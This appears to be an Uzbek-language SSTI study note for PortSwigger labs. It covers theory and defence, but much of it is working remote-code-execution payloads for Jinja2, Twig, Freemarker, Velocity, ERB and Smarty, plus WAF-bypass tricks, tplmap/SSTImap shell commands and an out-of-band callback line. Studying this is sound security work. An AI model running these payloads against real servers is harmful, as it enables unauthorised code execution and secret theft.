# Server-Side Template Injection (SSTI)

> Lab yechimlari (PortSwigger'ning 7 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Saytlar dinamik sahifani template engine (Jinja2, Twig, Freemarker, ERB...) bilan quradi:
`Salom {{name}}`. Agar ilova foydalanuvchi inputini template'ga **qiymat** sifatida emas,
**template'ning o'zi** sifatida qo'shsa (`render("Salom " + name)`), sen template sintaksisini
(`{{7*7}}`) tiqasan va engine uni **kod sifatida bajaradi**. Ko'p engine'da bu obyekt zanjiri
orqali OS buyrug'iga (RCE) chiqadi.

**Ildiz sabab:** foydalanuvchi matni template'ga concat qilib qo'shiladi (data → code). XSS'dan
farqi — kod **serverda** bajariladi, brauzerda emas. Shuning uchun oqibati ancha og'ir.

## Turlari
- **Plaintext context** — input to'g'ridan template matniga tushadi (`{{7*7}}` darhol 49 bo'ladi).
- **Code context** — input mavjud `{{...}}` ichida; avval uni yopib (`}}`) keyin kod qo'shasan.
- **Engine bo'yicha**: Jinja2/Twig (`{{7*7}}→49`, `{{7*'7'}}→7777777`), Freemarker/Velocity
  (`${7*7}→49`), ERB (`<%= 7*7 %>`), Handlebars/Node, Tornado, Smarty (PHP) — har biri alohida payload.
- **Sandboxed** — RCE to'g'ridan bloklangan; obyekt zanjiri (getClass) bilan sandbox'dan chiqasan.

## Oqibatlar (IMPACT)
- **RCE** — serverda OS buyrug'i (eng ko'p yakuni).
- `SECRET_KEY`/config o'qish → session/token forge → ATO.
- Ixtiyoriy fayl o'qish, SSRF.
> Odatda **High/Critical**. RCE chiqsa Critical.

## Qayerdan qidiriladi
Email shablon, "xush kelibsiz {name}", profil ism aks etishi, error sahifa,
PDF/HTML generator, CMS "customize".

## Aniqlash — polyglot
```
${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  ${{7*7}}  {{7*'7'}}
```
> `49` chiqsa SSTI bor. `{{7*7}}→49` va `{{7*'7'}}→7777777` = Jinja2/Twig.
> `${7*7}→49` = Freemarker/Velocity. `<%= 7*7 %>→49` = ERB.

## Exploit — engine bo'yicha

### Jinja2 (Python/Flask)
```python
{{config}}                                                     # SECRET_KEY leak
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP)
```php
{{['id']|filter('system')}}
{{['id','']|sort('system')}}
```

### Freemarker (Java)
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Velocity (Java)
```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### ERB (Ruby)
```ruby
<%= `id` %>
<%= system("id") %>
```

### Smarty (PHP)
```php
{system('id')}
```

## WAF bypass
```python
request['__cl'+'ass__']           # string bo'lish
{{()['\x5f\x5fclass\x5f\x5f']}}   # hex escape
{%print(7*7)%}                     # statement bloki
```

## TOOLLAR

### tplmap — SSTI podshosi
```bash
tplmap -u "https://target.com/page?name=INJECT"
```
> Payload joylab, engine'ni aniqlab, ishlaydigan RCE payloadini o'zi tanlaydi.

```bash
tplmap -u "URL" --os-shell
```
> Zaiflik topilsa to'g'ridan-to'g'ri OS shell ochadi.

```bash
tplmap -r request.txt -e jinja2
```
> Burp request'dan, aniq engine ko'rsatib (POST/header ichini ham) sinaydi.

### SSTImap — tplmap'ning yangilangan varianti
```bash
python3 SSTImap.py -u "https://target.com/?name=test"
```
> Ko'proq engine va payloadni qo'llab-quvvatlaydi, faol rivojlanadi.

### Burp Intruder — polyglot fuzzing
```
Burp Intruder → parametrga SSTI polyglot wordlist → javobda 49/7777777 qidir
```
> Qaysi parametr matematik natija qaytarsa — SSTI nuqtasi o'sha.

### interactsh — blind SSTI OOB
```bash
interactsh-client
```
> Javob chiqmasa `{{...os.popen('nslookup xxx.oast.pro')...}}` bilan callback kutasan.

## PoC
`49` natija → engine aniqlangan → `id`/`hostname` RCE'ni ko'rsat.

## Himoya
User input'ni template kod sifatida berma (logic-less template: Mustache), sandboxed
engine, input'ni data sifatida uzat (`render(tpl, name=input)`), template'ni dinamik qurma.
